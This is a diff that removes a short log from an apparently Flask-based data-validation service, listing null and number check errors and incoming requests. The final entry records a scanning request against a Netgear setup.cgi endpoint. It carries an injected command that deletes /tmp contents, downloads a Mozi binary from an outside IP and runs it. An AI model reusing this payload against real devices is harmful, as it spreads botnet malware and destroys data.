@@ -1,7 +1,0 @@
-INFO:werkzeug: * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
-ERROR:root:Data Error for null_check in Column name:num2 and Row number:1
-Data Error for number_check in Column name:num3 and Row number:2
-Data Error for null_check in Column name:num1 and Row number:3
-Data Error for number_check in Column name:num2 and Row number:3
-INFO:werkzeug:178.17.232.146 - - [13/Jan/2021 02:19:55] "[37mPOST /file_validation HTTP/1.1[0m" 200 -
-INFO:werkzeug:202.164.139.30 - - [13/Jan/2021 02:20:55] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.164.139.30:38906/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
